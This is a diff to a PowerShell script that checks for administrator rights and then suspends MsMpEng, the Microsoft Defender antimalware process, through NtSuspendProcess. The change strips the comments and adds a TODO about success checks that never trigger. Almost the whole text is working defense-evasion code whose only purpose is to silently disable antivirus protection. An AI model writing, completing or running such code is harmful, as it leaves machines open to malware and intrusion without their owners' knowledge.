@@ -83,7 +83,6 @@ function Test-Admin {
     return $isAdmin
 }
 
-# Check if the script is running with administrative privileges
 if (-not (Test-Admin)) {
     Write-Host "Please run the script with administrative privileges."
     return
@@ -95,24 +94,21 @@ $processName = "MsMpEng"
 $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
 
 if ($process -ne $null) {
-    # Define constants
     $PROCESS_SUSPEND_RESUME = 0x0800
 
-    # Get the process handle
     $processId = $process.Id
     $processHandle = [Kernel32]::OpenProcess($PROCESS_SUSPEND_RESUME, $false, $processId)
 
     if ($processHandle -ne [IntPtr]::Zero) {
-        # Suspend process
         $suspendResult = [NtDll]::NtSuspendProcess($processHandle)
 
+        # TODO: For some reason, I'm not entering these blocks even if the suspension is successful.
         if ($suspendResult -eq 0) {
             Write-Host "Process $($processName) suspended successfully."
         } else {
             Write-Host "Failed to suspend process $($processName). Error: $($suspendResult)"
         }
 
-        # Close the process handle
         [Kernel32]::CloseHandle($processHandle)
     } else {
         Write-Host "Failed to open process handle for $($processName)."
